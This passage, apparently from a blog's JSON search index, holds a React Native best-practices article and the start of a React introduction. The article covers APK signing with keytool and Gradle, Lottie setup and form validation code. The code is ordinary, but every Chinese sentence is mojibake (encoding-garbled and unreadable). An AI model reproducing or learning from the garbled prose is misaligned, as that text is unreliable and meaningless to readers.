libraryï¼‰ã€‚åœ¨è¯¥æ–‡ä»¶å†…ï¼Œä½¿ç”¨ä»¥å‰åˆ›å»ºçš„èƒŒæ™¯åˆ›å»ºå¸ƒå±€ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt;\r\u0026lt;LinearLayout xmlns:android=\u0026#34;http://schemas.android.com/apk/res/android\u0026#34;\randroid:orientation=\u0026#34;vertical\u0026#34;\randroid:layout_width=\u0026#34;match_parent\u0026#34;\randroid:layout_height=\u0026#34;match_parent\u0026#34;\randroid:background=\u0026#34;@drawable/background_splash\u0026#34;\r/\u0026gt; Step10. Â·android/app/src/main/res/values/colors.xmlÂ·åƒåœ¨æ­¥éª¤ 4 ä¸­ä¸€æ ·è½¬åˆ°å¹¶æ·»åŠ ä»¥ä¸‹æ ‡ç­¾ï¼Œå¦åˆ™ï¼Œè¯¥åº”ç”¨ç¨‹åºå°†å´©æºƒã€‚ä¸è¦æ›´æ”¹é¢œè‰²å€¼ã€‚\n\u0026lt;color name=\u0026#34;primary_dark\u0026#34;\u0026gt;#000\u0026lt;/color\u0026gt; å››ã€ReactNative ç­¾åæ‰“åŒ… apk(android)  step1. ç”Ÿæˆä¸€ä¸ªç­¾åå¯†é’¥\n C:\\Program Files\\Java\\jdk1.8.0_271\\bin ç›®å½•ä¸­ï¼Œæ‰§è¡Œ\nkeytool -genkeypair -v -keystore my-release-key.keystore -alias my-key-alias -keyalg RSA -keysize 2048 -validity 10000 ç”Ÿæˆ my-release-key.keystore å¯†é’¥åº“æ–‡ä»¶\n Step2. è®¾ç½® gradle å˜é‡\n 1.æŠŠ my-release-key.keystore æ–‡ä»¶æ”¾åˆ°ä½ å·¥ç¨‹ä¸­çš„ android/app æ–‡ä»¶å¤¹ä¸‹ã€‚ 2.ç¼–è¾‘é¡¹ç›®ç›®å½• /android/gradle.properties å¦‚æœæ²¡æœ‰ gradle.properties æ–‡ä»¶ä½ å°±è‡ªå·±åˆ›å»ºä¸€ä¸ªï¼Œæ·»åŠ å¦‚ä¸‹çš„ä»£ç ï¼ˆæ³¨æ„æŠŠå…¶ä¸­çš„**æ›¿æ¢ä¸ºç›¸åº”å¯†ç ï¼‰\nMYAPP_RELEASE_STORE_FILE=my-release-key.keystore\rMYAPP_RELEASE_KEY_ALIAS=my-key-alias\rMYAPP_RELEASE_STORE_PASSWORD=*****\rMYAPP_RELEASE_KEY_PASSWORD=*****  Step3. æŠŠç­¾åé…ç½®åŠ å…¥åˆ°é¡¹ç›®çš„ android/app/build.gradle é…ç½®ä¸­\n ...\randroid {\r...\rdefaultConfig { ... }\rsigningConfigs {\r+ release {\rif (project.hasProperty(\u0026#39;MYAPP_RELEASE_STORE_FILE\u0026#39;)) {\rstoreFile file(MYAPP_RELEASE_STORE_FILE)\rstorePassword MYAPP_RELEASE_STORE_PASSWORD\rkeyAlias MYAPP_RELEASE_KEY_ALIAS\rkeyPassword MYAPP_RELEASE_KEY_PASSWORD\r}\r}\r}\rbuildTypes {\rrelease {\r...\r+ signingConfig signingConfigs.release\r}\r}\r}\r...  step4. ç”Ÿæˆå‘è¡Œ APK åŒ…\n é¡¹ç›® android ç›®å½•ä¸­ï¼Œæ‰§è¡Œ\ngradlew assembleRelease //cmd æˆ–è€…\r./gradlew assembleRelease //PowerShell ç”Ÿæˆçš„ APK æ–‡ä»¶ä½äº android/app/build/outputs/apk/release/app-release.apk\nå¦‚æœéœ€è¦é‡æ–°æ‰“åŒ…ï¼Œéœ€å…ˆåˆ é™¤ \\android\\app\\build\\outputs\\apk ä¸­çš„ release æ–‡ä»¶å¤¹\n step5. æµ‹è¯•å‘è¡Œç‰ˆæœ¬\n npx react-native run-android --variant=release äº”ã€RN/Expo æ¸²æŸ“æœ¬åœ°å›¾ç‰‡(èµ„æº)åˆ—è¡¨ ç”±äº RN ä¸­å¼•ç”¨æœ¬åœ°å›¾ç‰‡æ˜¯ç”¨requireï¼Œè€Œ require æ˜¯è¿è¡Œæ—¶ç¼–è¯‘çš„ï¼Œæ‰€ä»¥ä¸èƒ½åœ¨ require ä¸­æ·»åŠ å˜é‡ã€‚å‚è€ƒ Link\nStep1. å°†æ‰€éœ€è¦çš„æœ¬åœ°å›¾ç‰‡ Require åˆ°ä¸€å¤„\nconst image1 = require(\u0026#39;../assets/Image1.png\u0026#39;)\rconst image2 = require(\u0026#39;../assets/Image2.png\u0026#39;) Step2. åˆ›å»ºä¸€ä¸ªæ•°ç»„å¯¹è±¡\nconst data = [\r{\u0026#34;id\u0026#34;:1, \u0026#34;url\u0026#34;: image1},\r{\u0026#34;id\u0026#34;:2, \u0026#34;url\u0026#34;: image2}\r] Step3. è¿™æ ·å°±å¯ä»¥ä½¿ç”¨ map æ¸²æŸ“ data æ•°æ®å¹¶æ­£ç¡®ä½¿ç”¨æœ¬åœ°å›¾ç‰‡äº†\nconst listItems = data.map(item =\u0026gt;\r\u0026lt;View key={item.id}\u0026gt;\r\u0026lt;Image source={item.url} /\u0026gt;\r\u0026lt;/View\u0026gt;\r) å…­ã€Lottieï¼ˆlottie-react-nativeï¼‰ Lottieæ˜¯ä»¥jsonæ ¼å¼å¯¼å‡ºçš„Adobe After EffectsåŠ¨ç”»åº“ï¼Œå¹¶åœ¨ç§»åŠ¨è®¾å¤‡å’ŒWebä¸Šæ¸²æŸ“ã€‚\næœ¬æ–‡åªä»‹ç»RNå®‰å“ç«¯çš„é…ç½®ã€‚\nä¸€. å®‰è£… ï¼ˆReact Native \u0026gt;= 0.60.0ï¼‰\nyarn add lottie-react-native äºŒ. é…ç½®æ–‡ä»¶ï¼ˆå¦‚æœåº”ç”¨åœ¨Androidä¸Šå´©æºƒï¼Œåˆ™è¡¨ç¤ºè‡ªåŠ¨é“¾æ¥æ— æ•ˆã€‚æ‰éœ€è¦è¿›è¡Œä»¥ä¸‹é…ç½®ï¼šï¼‰\n//1. android/app/src/main/java/\u0026lt;AppName\u0026gt;/MainApplication.java\r// åœ¨æ–‡ä»¶å…¥å£ï¼ˆå¤´éƒ¨ï¼‰ï¼Œæ·»åŠ \rimport com.airbnb.android.react.lottie.LottiePackage;\r// åœ¨List \u0026lt;ReactPackage\u0026gt; getPackages()ä¸­ï¼Œæ·»åŠ \rpackages.add(new LottiePackage());\r//2. android/app/build.gradle\r// åœ¨ dependencies å—ä¸­ï¼Œæ·»åŠ \rimplementation project(\u0026#39;:lottie-react-native\u0026#39;)\r//3. android/settings.gradle\rinclude \u0026#39;:lottie-react-native\u0026#39;\rproject(\u0026#39;:lottie-react-native\u0026#39;).projectDir = new File(rootProject.projectDir, \u0026#39;../node_modules/lottie-react-native/src/android\u0026#39;) ä¸‰. ä½¿ç”¨\nimport React from \u0026#39;react\u0026#39;;\rimport LottieView from \u0026#39;lottie-react-native\u0026#39;;\rexport default class BasicExample extends React.Component {\rrender() {\rreturn \u0026lt;LottieView source={require(\u0026#39;./assets/my.json\u0026#39;)} autoPlay loop /\u0026gt;;\r}\r} // å…¶ä¸­ï¼Œassets æ˜¯æ‰‹åŠ¨åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸­åˆ›å»ºçš„æ–‡ä»¶å¤¹ï¼Œè¿™é‡Œçš„my.jsonå³æ˜¯lottieåŠ¨ç”»æ–‡ä»¶\nåŠ¨ç”»æ–‡ä»¶ï¼šlottiefiles\nå››. å®‰è£…å®Œæ–°ä¾èµ–/æ–°æ·»æ–‡ä»¶åéœ€è¦é‡æ–°ç¼–è¯‘åˆ°å®‰å“è®¾å¤‡ä¸­ï¼Œyarn android\nä¸ƒã€RNè¡¨å•éªŒè¯ è¿™é‡Œçº¯æ‰‹å†™ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨react-hooks-formç­‰ç¬¬ä¸‰æ–¹åº“ã€‚ æ³¨æ„ï¼šselect çš„å¤„ç†æ–¹å¼\nimport React, { Component } from \u0026#34;react\u0026#34;;\rimport { StyleSheet, KeyboardAvoidingView, TouchableWithoutFeedback, Keyboard } from \u0026#34;react-native\u0026#34;;\rimport { Layout, Input, Button, Select, SelectItem, IndexPath } from \u0026#34;@ui-kitten/components\u0026#34;;\rconst validEmailRegex = RegExp(\r/^(([^\u0026lt;\u0026gt;()\\[\\]\\.,;:\\s@\\\u0026#34;]+(\\.[^\u0026lt;\u0026gt;()\\[\\]\\.,;:\\s@\\\u0026#34;]+)*)|(\\\u0026#34;.+\\\u0026#34;))@(([^\u0026lt;\u0026gt;()[\\]\\.,;:\\s@\\\u0026#34;]+\\.)+[^\u0026lt;\u0026gt;()[\\]\\.,;:\\s@\\\u0026#34;]{2,})$/i\r);\rconst validateForm = errors =\u0026gt; {\rlet valid = true;\rObject.values(errors).forEach(val =\u0026gt; val.length \u0026gt; 0 \u0026amp;\u0026amp; (valid = false));\rreturn valid;\r};\rconst data = [//1.selectåˆå§‹æ•°æ®\r\u0026#39;A\u0026#39;,\r\u0026#39;B\u0026#39;,\r\u0026#39;C\u0026#39;,\r];\rexport default class FormComponent extends Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rselectedIndex: new IndexPath(0),//2.selectåˆå§‹é€‰ä¸­\rfullName: null,\remail: null,\rpassword: null,\rerrors: {\rfullName: \u0026#34;\u0026#34;,\remail: \u0026#34;\u0026#34;,\rpassword: \u0026#34;\u0026#34;\r}\r};\r}\rhandlePress = () =\u0026gt; {\rif (this.isNotEmpty()) {\rif (validateForm(this.state.errors)) {\rKeyboard.dismiss();\r// alert(\u0026#34;Created successfully.\u0026#34;);\rconst postData = {\r\u0026#34;typeFeedBack\u0026#34;:data[this.state.selectedIndex.row],//3.selecté€‰ä¸­æ•°æ®\r}\rconsole.log(postData)\r}\r} else {\rvalidateForm(this.state.errors);\r}\r};\rhandleChange = (field, value) =\u0026gt; {\rlet errors = this.state.errors;\rswitch (field) {\rcase \u0026#34;fullName\u0026#34;:\rerrors.fullName = value.length \u0026lt; 5 ? \u0026#34;Full Name must be 5 characters long!\u0026#34; : \u0026#34;\u0026#34;;\rbreak;\rcase \u0026#34;email\u0026#34;:\rerrors.email = validEmailRegex.test(value) ? \u0026#34;\u0026#34; : \u0026#34;Email is not valid!\u0026#34;;\rbreak;\rcase \u0026#34;password\u0026#34;:\rerrors.password = value.length \u0026lt; 8 ? \u0026#34;Password must be 8 characters long!\u0026#34; : \u0026#34;\u0026#34;;\rbreak;\rdefault:\rbreak;\r}\rthis.setState({ errors, [field]: value });\r};\risNotEmpty = () =\u0026gt; {\rconst { fullName, email, password } = this.state;\rlet isNoError = true;\rif (!fullName) {\rthis.setState(prevState =\u0026gt; ({\rerrors: {\r...prevState.errors,\rfullName: \u0026#34;Full Name is required.\u0026#34;\r}\r}));\risNoError = false;\r}\rif (!email) {\rthis.setState(prevState =\u0026gt; ({\rerrors: {\r...prevState.errors,\remail: \u0026#34;Email Address is required.\u0026#34;\r}\r}));\risNoError = false;\r}\rif (!password) {\rthis.setState(prevState =\u0026gt; ({\rerrors: {\r...prevState.errors,\rpassword: \u0026#34;Password is required.\u0026#34;\r}\r}));\risNoError = false;\r}\rreturn isNoError;\r};\rrender() {\rconst { selectedIndex, fullName, email, password, errors } = this.state;\rconst displayValue = data[selectedIndex.row];//4.selecté€‰ä¸­çš„å€¼\rconst renderOption = (title: string, index: number) =\u0026gt; (//5.select option\r\u0026lt;SelectItem key={index} title={title} /\u0026gt;\r);\rreturn (\r\u0026lt;KeyboardAvoidingView behavior=\u0026#34;padding\u0026#34; style={{ flex: 1 }}\u0026gt;\r\u0026lt;TouchableWithoutFeedback onPress={() =\u0026gt; Keyboard.dismiss()}\u0026gt;\r\u0026lt;Layout style={styles.container}\u0026gt;\r\u0026lt;Select //6. selectç»„ä»¶æ¸²æŸ“\rselectedIndex={selectedIndex}\ronSelect={(index) =\u0026gt; this.setState({ selectedIndex: index })}\rvalue={displayValue}\r\u0026gt;\r{data.map(renderOption)}\r\u0026lt;/Select\u0026gt;\r\u0026lt;Input\rvalue={fullName}\rlabel=\u0026#34;Full Name\u0026#34;\rcaptionTextStyle={styles.captionTextStyle}\rcaption={errors.fullName.length \u0026gt; 0 \u0026amp;\u0026amp; errors.fullName}\rstatus={errors.fullName.length \u0026gt; 0 ? \u0026#34;danger\u0026#34; : \u0026#34;\u0026#34;}\ronChangeText={value =\u0026gt; this.handleChange(\u0026#34;fullName\u0026#34;, value)}\r/\u0026gt;\r\u0026lt;Input\rvalue={email}\rlabel=\u0026#34;Email Address\u0026#34;\rkeyboardType=\u0026#34;email-address\u0026#34;\rautoCapitalize=\u0026#34;none\u0026#34;\rcaptionTextStyle={styles.captionTextStyle}\rcaption={errors.email.length \u0026gt; 0 \u0026amp;\u0026amp; errors.email}\rstatus={errors.email.length \u0026gt; 0 ? \u0026#34;danger\u0026#34; : \u0026#34;\u0026#34;}\ronChangeText={value =\u0026gt; this.handleChange(\u0026#34;email\u0026#34;, value)}\r/\u0026gt;\r\u0026lt;Input\rvalue={password}\rlabel=\u0026#34;Password\u0026#34;\rsecureTextEntry\rcaptionTextStyle={styles.captionTextStyle}\rcaption={errors.password.length \u0026gt; 0 \u0026amp;\u0026amp; errors.password}\rstatus={errors.password.length \u0026gt; 0 ? \u0026#34;danger\u0026#34; : \u0026#34;\u0026#34;}\ronChangeText={value =\u0026gt; this.handleChange(\u0026#34;password\u0026#34;, value)}\r/\u0026gt;\r\u0026lt;Button style={styles.btn} onPress={this.handlePress}\u0026gt;\rSubmit\r\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r\u0026lt;/TouchableWithoutFeedback\u0026gt;\r\u0026lt;/KeyboardAvoidingView\u0026gt;\r);\r}\r}\rconst styles = StyleSheet.create({\rcontainer: {\rflex: 1,\rjustifyContent: \u0026#34;center\u0026#34;,\rpaddingHorizontal: 10,\rwidth: 600\r},\rcaptionTextStyle: {\rcolor: \u0026#34;red\u0026#34;\r},\rbtn: {\rmarginVertical: 5\r}\r}); react-hooks-form ä½¿ç”¨ç¤ºä¾‹ï¼ˆåŒ…å«selectï¼‰ import React from \u0026#34;react\u0026#34;;\rimport { StyleSheet } from \u0026#34;react-native\u0026#34;;\rimport { Layout, Input, Button, Select, SelectItem, IndexPath, Text } from \u0026#34;@ui-kitten/components\u0026#34;;\rimport { useForm, Controller } from \u0026#34;react-hook-form\u0026#34;;\rconst selectData = [\r\u0026#39;A\u0026#39;,\r\u0026#39;B\u0026#39;,\r\u0026#39;C\u0026#39;,\r];\rexport default function FormComponent() {\rconst { control, handleSubmit, errors } = useForm();\rconst onSubmit = (data: any) =\u0026gt; {\rconst postData = {\r\u0026#34;typeFeedBack\u0026#34;: displayValue,//selecté€‰çš„å€¼\r\u0026#34;firstName\u0026#34;: data.firstName,\r\u0026#34;lastName\u0026#34;: data.lastName\r}\rconsole.log(postData)\r};\rconst [selectedIndex, setSelectedIndex] = React.useState(new IndexPath(0));\rconst displayValue = selectData[selectedIndex.row];\rconst renderOption = (title: string, index: number) =\u0026gt; (\r\u0026lt;SelectItem key={index} title={title} /\u0026gt;\r);\rreturn (\r\u0026lt;Layout style={styles.container} level=\u0026#39;4\u0026#39;\u0026gt;\r\u0026lt;Controller\rcontrol={control}\rrender={() =\u0026gt; (\r\u0026lt;Select\rstyle={styles.input}\rplaceholder=\u0026#39;Default\u0026#39;\rvalue={displayValue}\rselectedIndex={selectedIndex}\ronSelect={index =\u0026gt; setSelectedIndex(index)}\u0026gt;\r{selectData.map(renderOption)}\r\u0026lt;/Select\u0026gt;\r)}\rname=\u0026#34;typeFeedBack\u0026#34;//è¿™é‡Œè¿™ä¸ªåå­—ä¸é‡è¦ï¼Œåªè¦éšä¾¿å–ä¸€ä¸ªæ²¡æœ‰çš„å°±å¯ä»¥ã€‚å› ä¸ºselectæˆ‘è¦å•ç‹¬å¤„ç†\rdefaultValue=\u0026#34;\u0026#34;//å¿…é¡»ï¼Œå¯ä»¥ä¸ºç©º\r/\u0026gt;\r\u0026lt;Controller\rcontrol={control}\rrender={({ onChange, onBlur, value }) =\u0026gt; (\r\u0026lt;Input\rstyle={styles.input}\rlabel=\u0026#39;å§“æ°\u0026#39;\ronBlur={onBlur}\ronChangeText={value =\u0026gt; onChange(value)}\rvalue={value}\r/\u0026gt;\r)}\rname=\u0026#34;firstName\u0026#34;\rrules={{ required: true }}\rdefaultValue=\u0026#34;\u0026#34;\r/\u0026gt;\r{errors.firstName \u0026amp;\u0026amp; \u0026lt;Text\u0026gt;This is required.\u0026lt;/Text\u0026gt;}\r\u0026lt;Controller\rcontrol={control}\rrender={({ onChange, onBlur, value }) =\u0026gt; (\r\u0026lt;Input\rstyle={styles.input}\rlabel=\u0026#39;åå­—\u0026#39;\ronBlur={onBlur}\ronChangeText={value =\u0026gt; onChange(value)}\rvalue={value}\r/\u0026gt;\r)}\rname=\u0026#34;lastName\u0026#34;\rrules={{ required: true }}\rdefaultValue=\u0026#34;\u0026#34;\r/\u0026gt;\r{errors.lastName \u0026amp;\u0026amp; \u0026lt;Text\u0026gt;This is required.\u0026lt;/Text\u0026gt;}\r\u0026lt;Button style={styles.button} onPress={handleSubmit(onSubmit)}\u0026gt;æäº¤\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r);\r}\rconst styles = StyleSheet.create({\rcontainer: {\rpaddingLeft: 20,\rpaddingRight: 20,\rpaddingBottom: 20\r},\rinput: {\rwidth: 500,\rmarginTop: 20\r},\rbutton: {\rmarginTop: 20\r}\r}) ","description":"","id":42,"section":"react-native","tags":null,"title":"React-Native æœ€ä½³å®è·µ","uri":"https://codthing.github.io/react-native/react-native/rn-bp/"},{"content":"React ç®€ä»‹ å¤šå¹´æ¥ï¼Œå¯¹ä½¿ç”¨ JavaScript ç¼–å†™ç”¨æˆ·ç•Œé¢çš„ç›´æ¥æ–¹æ³•çš„éœ€æ±‚ä¸æ–­å¢åŠ ã€‚ Reactï¼Œä¹Ÿç§°ä¸º React.jsï¼Œæ˜¯ Facebook è®¾è®¡çš„å¼€æº JavaScript åº“ï¼Œç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢æˆ– UI ç»„ä»¶ã€‚\nReact å½“ç„¶ä¸æ˜¯å”¯ä¸€çš„ UI åº“ã€‚ Preactã€Vueã€Angularã€Svelteã€Lit å’Œè®¸å¤šå…¶ä»–å·¥å…·ä¹Ÿéå¸¸é€‚åˆä»å¯é‡ç”¨å…ƒç´ ç»„åˆç•Œé¢ã€‚\né‰´äº React çš„å—æ¬¢è¿ç¨‹åº¦ï¼Œè€ƒè™‘åˆ°æˆ‘ä»¬å°†ä½¿ç”¨å®ƒæ¥äº†è§£æœ¬æŒ‡å—ä¸­çš„ä¸€äº›è®¾è®¡ã€æ¸²æŸ“å’Œæ€§èƒ½æ¨¡å¼ï¼Œå› æ­¤æœ‰å¿…è¦äº†è§£å®ƒçš„å·¥ä½œåŸç†ã€‚\nå½“å‰ç«¯å¼€å‘äººå‘˜è°ˆè®ºä»£ç æ—¶ï¼Œé€šå¸¸æ˜¯åœ¨ä¸º Web è®¾è®¡ç•Œé¢çš„ä¸Šä¸‹æ–‡ä¸­ã€‚æˆ‘ä»¬è®¤ä¸ºç•Œé¢ç»„åˆçš„æ–¹å¼æ˜¯å…ƒç´ ï¼Œå¦‚æŒ‰é’®ã€åˆ—è¡¨ã€å¯¼èˆªç­‰ã€‚ React æä¾›äº†ä¸€ç§ä¼˜åŒ–å’Œç®€åŒ–çš„æ–¹å¼æ¥è¡¨è¾¾è¿™äº›å…ƒç´ ä¸­çš„æ¥å£ã€‚å®ƒè¿˜é€šè¿‡å°†æ‚¨çš„ç•Œé¢ç»„ç»‡æˆä¸‰ä¸ªå…³é”®æ¦‚å¿µâ€”â€”ç»„ä»¶ã€é“å…·å’ŒçŠ¶æ€ï¼Œå¸®åŠ©æ„å»ºå¤æ‚å’Œæ£˜æ‰‹çš„ç•Œé¢ã€‚\nå› ä¸º React ä»¥ç»„åˆä¸ºä¸­å¿ƒï¼Œæ‰€ä»¥å®ƒå¯ä»¥å®Œç¾åœ°æ˜ å°„åˆ°è®¾è®¡ç³»ç»Ÿçš„å…ƒç´ ã€‚\næ‰€ä»¥ï¼Œæœ¬è´¨ä¸Šï¼Œä¸º React è®¾è®¡å®é™…ä¸Šæ˜¯åœ¨é¼“åŠ±ä½ ä»¥æ¨¡å—åŒ–çš„æ–¹å¼æ€è€ƒã€‚\nå®ƒå…è®¸æ‚¨åœ¨ç»„åˆé¡µé¢æˆ–è§†å›¾ä¹‹å‰è®¾è®¡å•ç‹¬çš„ç»„ä»¶ï¼Œå› æ­¤å¯ä»¥å®Œå…¨äº†è§£æ¯ä¸ªç»„ä»¶çš„èŒƒå›´å’Œç›®çš„â€”â€”è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºç»„ä»¶åŒ–ã€‚\n\ræœ¯è¯­   React / React.js / ReactJS - React åº“ï¼Œç”± Facebook äº 2013 å¹´åˆ›å»º\n  ReactDOM - ç”¨äº DOM å’ŒæœåŠ¡å™¨æ¸²æŸ“çš„åŒ…\n  JSX - JavaScript çš„è¯­æ³•æ‰©å±•\n  Redux - é›†ä¸­çŠ¶æ€å®¹å™¨\n  Hooks - ä¸€ç§æ— éœ€ç¼–å†™ç±»å³å¯ä½¿ç”¨çŠ¶æ€å’Œå…¶ä»– React åŠŸèƒ½çš„æ–°æ–¹æ³•\n  ReactNative - ä½¿ç”¨ Javascript å¼€å‘è·¨å¹³å°æœ¬æœºåº”ç”¨ç¨‹åºçš„åº“\n  Webpack - åœ¨ React ç¤¾åŒºä¸­æµè¡Œçš„ JavaScript æ¨¡å—æ†ç»‘å™¨ã€‚\n  CRAï¼ˆåˆ›å»º React åº”ç”¨ç¨‹åºï¼‰- ä¸€ç§ CLI å·¥å…·ï¼Œç”¨äºåˆ›å»ºç”¨äºå¼•å¯¼é¡¹ç›®çš„è„šæ‰‹æ¶ React åº”ç”¨ç¨‹åºã€‚\n  Next.js - ä¸€ä¸ª React æ¡†æ¶ï¼Œå…·æœ‰è®¸å¤šä¸€æµçš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬ SSRã€ä»£ç æ‹†åˆ†ã€æ€§èƒ½ä¼˜åŒ–ç­‰ã€‚\n  \rä½¿ç”¨ JSX æ¸²æŸ“ æˆ‘ä»¬å°†åœ¨è®¸å¤šç¤ºä¾‹ä¸­ä½¿ç”¨ JSXã€‚\nJSX æ˜¯ JavaScript çš„æ‰©å±•ï¼Œå®ƒä½¿ç”¨ç±»ä¼¼ XML çš„è¯­æ³•å°†æ¨¡æ¿ HTML åµŒå…¥åˆ° JS ä¸­ã€‚\nå®ƒæ—¨åœ¨è½¬æ¢ä¸ºæœ‰æ•ˆçš„ JavaScriptï¼Œå°½ç®¡è¯¥è½¬æ¢çš„è¯­ä¹‰æ˜¯ç‰¹å®šäºå®ç°çš„ã€‚\nJSX åœ¨ React åº“ä¸­è¶Šæ¥è¶Šå—æ¬¢è¿ï¼Œä½†æ­¤åä¹Ÿå‡ºç°äº†å…¶ä»–å®ç°ã€‚\n\rComponents, Props, State ç»„ä»¶ã€é“å…·å’ŒçŠ¶æ€æ˜¯ React ä¸­çš„ä¸‰ä¸ªå…³é”®æ¦‚å¿µã€‚\nå®é™…ä¸Šï¼Œåœ¨ React ä¸­çœ‹åˆ°æˆ–åšçš„æ‰€æœ‰äº‹æƒ…éƒ½å¯ä»¥å½’ç±»ä¸ºè¿™äº›å…³é”®æ¦‚å¿µä¸­çš„è‡³å°‘ä¸€ä¸ªï¼Œä»¥ä¸‹æ˜¯è¿™äº›å…³é”®æ¦‚å¿µçš„å¿«é€Ÿæµè§ˆï¼š\n1. Components ç»„ä»¶æ˜¯ä»»ä½• React åº”ç”¨ç¨‹åºçš„æ„å»ºå—ã€‚ å®ƒä»¬å°±åƒ JavaScript å‡½æ•°ï¼Œæ¥å—ä»»æ„è¾“å…¥ï¼ˆPropsï¼‰ å¹¶è¿”å›æè¿°åº”è¯¥åœ¨å±å¹•ä¸Šæ˜¾ç¤ºçš„å†…å®¹çš„ React å…ƒç´ ã€‚\né¦–å…ˆè¦ç†è§£çš„æ˜¯ï¼ŒReact åº”ç”¨ç¨‹åºå±å¹•ä¸Šçš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯ç»„ä»¶çš„ä¸€éƒ¨åˆ†ã€‚ ä»æœ¬è´¨ä¸Šè®²ï¼ŒReact åº”ç”¨ç¨‹åºåªæ˜¯ç»„ä»¶å†…ç»„ä»¶ä¸­çš„ç»„ä»¶ã€‚ æ‰€ä»¥å¼€å‘è€…ä¸ç”¨åœ¨ React ä¸­æ„å»ºé¡µé¢ï¼› ä»–ä»¬æ„å»ºç»„ä»¶ã€‚\nç»„ä»¶å¯è®©æ‚¨å°† UI æ‹†åˆ†ä¸ºç‹¬ç«‹çš„ã€å¯é‡ç”¨çš„éƒ¨åˆ†ã€‚ å¦‚æœæ‚¨ä¹ æƒ¯äºè®¾è®¡é¡µé¢ï¼Œé‚£ä¹ˆä»¥è¿™ç§æ¨¡å—åŒ–æ–¹å¼æ€è€ƒä¼¼ä¹æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„å˜åŒ–ã€‚ ä½†æ˜¯å¦‚æœä½ ä½¿ç”¨è®¾è®¡ç³»ç»Ÿæˆ–é£æ ¼æŒ‡å—å‘¢ï¼Ÿ é‚£ä¹ˆè¿™å¯èƒ½ä¸åƒçœ‹èµ·æ¥é‚£ä¹ˆå¤§çš„èŒƒå¼è½¬å˜ã€‚\nå®šä¹‰ç»„ä»¶æœ€ç›´æ¥çš„æ–¹å¼æ˜¯ç¼–å†™ JavaScript å‡½æ•°ã€‚\nfunction Badge(props) {\rreturn \u0026lt;h1\u0026gt;Hello, my name is {props.name}\u0026lt;/h1\u0026gt;;\r} è¿™ä¸ªå‡½æ•°æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ React ç»„ä»¶ï¼Œå› ä¸ºå®ƒæ¥å—å¸¦æœ‰æ•°æ®çš„å•ä¸ª propï¼ˆä»£è¡¨å±æ€§ï¼‰å¯¹è±¡å‚æ•°å¹¶è¿”å›ä¸€ä¸ª React å…ƒç´ ã€‚ æ­¤ç±»ç»„ä»¶ç§°ä¸ºâ€œå‡½æ•°ç»„ä»¶â€ï¼Œå› ä¸ºå®ƒä»¬å®é™…ä¸Šæ˜¯ JavaScript å‡½æ•°ã€‚\né™¤äº†åŠŸèƒ½ç»„ä»¶ï¼Œå¦ä¸€ç§ç±»å‹çš„ç»„ä»¶æ˜¯â€œç±»ç»„ä»¶â€ã€‚ ç±»ç»„ä»¶ä¸å‡½æ•°ç»„ä»¶çš„ä¸åŒä¹‹å¤„åœ¨äºå®ƒæ˜¯ç”± ES6 class å®šä¹‰çš„ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\nclass Badge extends React.Component {\rrender() {\rreturn \u0026lt;h1\u0026gt;Hello, my name is {this.props.name}\u0026lt;/h1\u0026gt;;\r}\r} æå–ç»„ä»¶\nä¸ºäº†è¯´æ˜ç»„ä»¶å¯ä»¥æ‹†åˆ†ä¸ºæ›´å°çš„ç»„ä»¶è¿™ä¸€äº‹å®ï¼Œè¯·è€ƒè™‘ä»¥ä¸‹ Tweet ç»„ä»¶ï¼š\nå¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼å®ç°ï¼š\nfunction Tweet(props) {\rreturn (\r\u0026lt;div className=\u0026#34;Tweet\u0026#34;\u0026gt;\r\u0026lt;div className=\u0026#34;User\u0026#34;\u0026gt;\r\u0026lt;img className=\u0026#34;Avatar\u0026#34;\rsrc={props.author.avatarUrl}\ralt={props.author.name}\r/\u0026gt;\r\u0026lt;div className=\u0026#34;User-name\u0026#34;\u0026gt;\r{props.author.name}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-text\u0026#34;\u0026gt;\r{props.text}\r\u0026lt;/div\u0026gt;\r\u0026lt;img className=\u0026#34;Tweet-image\u0026#34;\rsrc={props.image.imageUrl}\ralt={props.image.description}\r/\u0026gt;\r\u0026lt;div className=\u0026#34;Tweet-date\u0026#34;\u0026gt;\r{formatDate(props.date)}\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} è¿™ä¸ªç»„ä»¶å¯èƒ½æœ‰ç‚¹éš¾ä»¥æ“ä½œï¼Œå› ä¸ºå®ƒæ˜¯å¤šä¹ˆçš„é›†ç¾¤ï¼Œå¹¶ä¸”é‡ç”¨å®ƒçš„å„ä¸ªéƒ¨åˆ†ä¹Ÿå¾ˆå›°éš¾ã€‚ ä½†æ˜¯ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥ä»ä¸­æå–ä¸€äº›ç»„ä»¶ã€‚\næˆ‘ä»¬è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯æå–å¤´åƒï¼š\nfunction Avatar(props) {\rreturn (\r\u0026lt;img className=\u0026#34;Avatar\u0026#34;\rsrc={props.user.avatarUrl}\ralt={props.user.name}\r/\u0026gt;\r);\r} Avatar ä¸éœ€è¦çŸ¥é“å®ƒæ˜¯åœ¨ Comment ä¸­å‘ˆç°çš„ã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬ç»™å®ƒçš„é“å…·ä¸€ä¸ªæ›´é€šç”¨çš„åå­—ï¼šç”¨æˆ·è€Œä¸æ˜¯ä½œè€…ã€‚\nç°åœ¨æˆ‘ä»¬å°†æ³¨é‡Šç®€åŒ–ä¸€ç‚¹ï¼š\nfunction Tweet(props) {\rreturn (\r\u0026lt;div 